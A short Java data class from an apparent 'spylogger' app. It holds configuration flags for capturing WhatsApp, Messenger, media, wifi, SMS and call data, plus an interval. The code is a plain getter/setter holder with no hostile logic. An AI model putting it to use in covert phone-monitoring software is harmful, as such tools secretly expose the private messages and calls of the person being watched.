package com.gravatasufoca.spylogger.vos;

import com.gravatasufoca.spylogger.model.Configuracao;

import lombok.Getter;
import lombok.Setter;

/**
 * Created by bruno on 31/01/17.
 */
@Setter
@Getter
public class ConfiguracaoVO {
    private String chave;
    private boolean miniatura;
    private boolean media;
    private boolean whatsApp;
    private boolean messenger;
    private boolean wifi;
    private String smsBlacklist;
    private String chamadasBlacklist;
    private Integer intervalo;

    public ConfiguracaoVO(Configuracao configuracao) {
        this.miniatura=configuracao.isMiniatura();
        this.media=configuracao.isMedia();
        this.whatsApp=configuracao.isWhatsApp();
        this.messenger =configuracao.isFacebook();
        this.wifi=configuracao.isWifi();
        this.smsBlacklist=configuracao.getSmsBlacklist();
        this.chamadasBlacklist=configuracao.getChamadasBlacklist();
        this.intervalo=configuracao.getIntervalo();
    }
}
